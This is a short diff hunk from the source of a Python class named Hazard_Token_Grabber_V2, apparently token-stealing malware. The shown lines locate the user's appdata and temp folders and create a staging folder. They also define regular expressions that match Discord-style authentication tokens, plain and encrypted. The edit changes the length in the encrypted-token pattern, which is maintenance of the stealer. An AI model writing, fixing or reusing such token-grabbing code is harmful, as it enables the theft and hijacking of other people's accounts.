@@ -24,7 +24,7 @@ class Hazard_Token_Grabber_V2:
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{160}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
